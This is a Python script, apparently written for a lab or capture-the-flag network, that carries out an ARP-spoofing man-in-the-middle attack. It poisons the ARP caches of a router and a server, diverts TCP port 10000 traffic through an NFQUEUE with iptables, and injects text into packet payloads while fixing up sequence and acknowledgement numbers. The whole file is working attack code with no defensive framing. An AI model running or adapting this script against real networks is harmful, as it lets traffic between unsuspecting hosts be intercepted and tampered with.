from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import threading
import time
import os
import random
MIDDLE_MAC = get_if_hwaddr("eth0")

ROUTER_IP = "198.10.0.1"
SERVER_IP = "198.10.0.2"

ROUTER_MAC = getmacbyip(ROUTER_IP)
SERVER_MAC = getmacbyip(SERVER_IP)


def poison(target_ip, target_mac, spoof_ip):
    pkt = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                      psrc=spoof_ip, hwsrc=MIDDLE_MAC)
    while True:
        sendp(pkt, iface="eth0", verbose=False)
        time.sleep(2)


t1 = threading.Thread(target=poison, args=(ROUTER_IP, ROUTER_MAC, SERVER_IP))
t2 = threading.Thread(target=poison, args=(SERVER_IP, SERVER_MAC, ROUTER_IP))
t1.daemon = True
t2.daemon = True
t1.start()
t2.start()

print("[*] ARP spoofing started")
print(f"    MIDDLE MAC : {MIDDLE_MAC}")
print(f"    ROUTER MAC : {ROUTER_MAC}")
print(f"    SERVER MAC : {SERVER_MAC}")

offsets = {}

def process_packet(packet):
    octets = packet.get_payload()
    pkt = IP(octets)

    if not pkt.haslayer(TCP):
        packet.accept()
        return

    conn = (pkt[IP].src, pkt[TCP].sport, pkt[IP].dst, pkt[TCP].dport)
    conn_rev = (pkt[IP].dst, pkt[TCP].dport, pkt[IP].src, pkt[TCP].sport)

    offset = offsets.get(conn, 0)
    rev_offset = offsets.get(conn_rev, 0)

    has_push = pkt.haslayer(Raw) and (pkt[TCP].flags & 0x08)
    has_offset = offset != 0 or rev_offset != 0

    if not has_push and not has_offset:
        packet.accept()
        return

    pkt[TCP].seq += offset
    pkt[TCP].ack -= rev_offset

    diff = 0
    if has_push:
        payload = pkt[Raw].load
        modified = b"sunt.software (best DNS)" + payload + random.choices([" 67"," 67.67",""],[67,67.67,420])[0].encode()
        diff = len(modified) - len(payload)
        pkt[Raw].load = modified #six seven
        print(f"{pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport} | {payload} => {modified}")

    del pkt[IP].len
    del pkt[IP].chksum
    del pkt[TCP].chksum

    send(pkt, verbose=False)
    if diff:
        offsets[conn] = offset + diff
    packet.drop()


def start_nfq():
    os.system("iptables -I FORWARD -p tcp --dport 10000 -j NFQUEUE --queue-num 10")
    os.system("iptables -I FORWARD -p tcp --sport 10000 -j NFQUEUE --queue-num 10")
    q = NFQ()
    try:
        q.bind(10, process_packet)
        q.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        q.unbind()


t1.join(0)
start_nfq()
